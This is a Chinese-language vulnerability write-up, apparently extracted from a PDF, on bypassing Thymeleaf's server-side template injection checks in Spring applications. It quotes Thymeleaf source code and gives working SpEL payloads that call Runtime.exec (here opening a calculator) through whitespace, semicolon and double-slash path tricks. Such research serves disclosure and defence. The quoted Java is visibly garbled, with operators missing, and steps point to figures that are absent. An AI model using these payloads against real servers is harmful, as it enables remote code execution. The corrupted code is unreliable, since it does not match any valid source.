                Configuration configuration = 
viewTemplateEngine.getConfiguration(); 
                ProcessingContext processingContext = new 
ProcessingContext(context); 
                templateCharacterEncoding = 
getStandardDialectPrefix(configuration); 
                StandardFragment fragment = 
StandardFragmentProcessor.computeStandardFragmentSpec(configuration, 
processingContext, viewTemplateName, templateCharacterEncoding, 
"fragment"); 
                if (fragment == null) { 
                    throw new IllegalArgumentException("Invalid template 
name specification: '" + viewTemplateName + "'"); 
                } 
        ... 
JAVA
003 Thymeleaf SSTI Bypass
在该⽂件中，就有说明：
当调⽤表达式的时候，会经过该函数的判断：
来看看该函数：
public static boolean containsSpELInstantiationOrStatic(final String 
expression) { 
        final int explen = expression.length(); 
        int n = explen; 
        int ni = 0; // index for computing position in the NEW_ARRAY 
        int si = -1; 
        char c; 
        while (n-- != 0) { 
            c = expression.charAt(n); 
            if (ni  0 || ((n + 1  0) { 
                n += ni; 
                ni = 0; 
                if (si  n && c == '(' 
                        && ((n - 1 >= 0) && (expression.charAt(n - 1) == 
'T')) 
                        && ((n - 1 == 0) || 
!Character.isJavaIdentifierPart(expression.charAt(n - 2)))) { 
                return true; 
            } else if (si > n && !(Character.isJavaIdentifierPart(c) || c 
== '.')) { 
                si = -1; 
            } 
        } 
        return false; 
    } 
因此要绕过这个函数，只要满⾜三点：
1、表达式中不能含有关键字 new  
2、在 ( 的左边的字符不能是 T  
3、不能在 T 和 ( 中间添加的字符使得原表达式出现问题
因此可以利⽤的字符有 %20 (空格)、 %0a (换⾏)、 %09 (制表符)，此外，通过 fuzzing 同样可以找
到很多可以利⽤的字符：
有兴趣的朋友可以⾃⼰测试还有哪些可以绕过
需要注意的是，这种绕过⽅式针对的情景是当传⼊的路径名可控时，如：
这⾥有⼀个点需要注意，可以看到上⾯⼀个图⽚中 path 和返回的视图名不⼀样，path
为 /admin/* ，返回的视图名为 language/cn/* ，但当 path 和返回的视图名⼀样的时候，如下：
实际上上述payload 是没有⽤的
为什么呢？
实际上在 3.0.12 版本，除了加了 SpringStandardExpressionUtils.java ，同样还增加了
SpringRequestUtils.java ⽂件：
并且看其描述：
如果视图名称包含在 URL 的路径或参数中，请避免将视图名称作为⽚段表达式执⾏
意思就是如果视图的名字和 path ⼀致，那么就会经过 SpringRequestUtils.java 中的
checkViewNameNotInRequest 函数检测：
可以看到，如果 requestURI 不为空，并且不包含 vn 的值，即可进⼊判断，从⽽经过
checkViewNameNotInRequest 的“良⺠”认证。
⾸先按照上⽂中的 Poc： __${T%20(java.lang.Runtime).getRuntime().exec(%22open%20-
a%20calculator%22)}__::.x/
我们可以得到 vn  的值为 home/__${t(java.lang.runtime).getruntime().exec("open-
acalculator")}__::.x
既然 vn 的值确定下来，那么接下来只要令 requestURI.contains(vn) 为假，就能达到我们的⽬
的
contains 区分⼤⼩写，那么……
别想了，因为 pack ⽅法已经经过了 toLowerCase 处理
那么是不是么办法了？答案是否定的（废话，三梦师傅给出了答案）
我们先看 requestURI 是怎么来的：
跟进 unescapeUriPath ⽅法：
跟进 unescapeUriPath ⽅法：
调⽤了 UriEscapeUtil.unescape ，跟进：
该函数⾸先检测传⼊的字符中是否是 % (ESCAPE_PREFIX)或者 + ，如果是，那么进⾏⼆次处理：
将 + 转义成空格
如果 % 的数量⼤于⼀，需要⼀次将它们全部转义
处理完毕后，将处理后的字符串返还回
如果实际不需要unescape，那么不经过处理，直接返回原始字符串对象
最终，就得到了 requestURI
貌似，也没啥特殊的地⽅
既然没有特殊的地⽅，那么我们只需要思考，如何从正⾯令 requestURI.contains(vn) 为假，即
令 requestURI 不等于 home/__${t(java.lang.runtime).getruntime().exec("open-
acalculator")}__::.x 即可
这件事本质是令两个字符串不相等，并且要满⾜路由条件（ /home/* 路径下）
那么结论就来了
Bypass 技巧 1：
这也是三梦师傅在群⾥提到的
home;/__${t(java.lang.runtime).getruntime().exec("open-acalculator")}__::.x
只需要在 home 的后⾯加上⼀个分号即可
这是因为在 SpringBoot 中，SpringBoot 有⼀个功能叫做矩阵变量，默认是禁⽤状态：
如果发现路径中存在分号，那么会调⽤ removeSemicolonContent ⽅法来移除分号
这样⼀来使得传⼊的字符和 vn 不相同，并且⼜满⾜路由条件！成功绕过
checkViewNameNotInRequest 的检测
Bypass 技巧 2：
这个 Bypass 是我分析的时候想到的，前⾯也提到了，我们的实际⽬标就是令两个字符串不相等，
并且要满⾜路由条件（ /home/* 路径下），那么：
home//__${t(java.lang.runtime).getruntime().exec("open-acalculator")}__::.x 和
home/__${t(java.lang.runtime).getruntime().exec("open-acalculator")}__::.x 不相
等，并且满⾜路由条件！完美！（原理不⽤解释了吧）
最后提⼀点，实际上 payload 中不能含有 / ，否则会执⾏不成功：
原因其实就是路由条件不相等，因为解析器看来是这样的路径
/home;/__${T (java.lang.Runtime).getRuntime().exec("open -a /System
/Applications  /Calculator.app")}__::.x/
遗憾的是，这 Bypass Thymeleaf 官⽅并没有给三梦师傅分配 CVE，和三梦师傅讨论认为，
Thymeleaf 认为这是开发者需要注意到的地⽅（因为 return 的内容是由开发者控制，开发者应当
注意这个问题），不过这个理由牵不牵强，就只能⾃⼰领会了
004 总结
实际上由于时间问题，还有⼀些内容没有横向扩展，⽐如，当不 return 的时候：
能否 Bypass？
当模板内容可控的时候：
⼜能否 Bypass？
此外，java 常⽤的其他模板引擎，如 Velocity、Freemarker、Pebble 和 Jinjava 是否存在类似问
题？
这些问题在我有时间的时候会尝试去解决，也同时欢迎其他师傅共同分析思考这些问题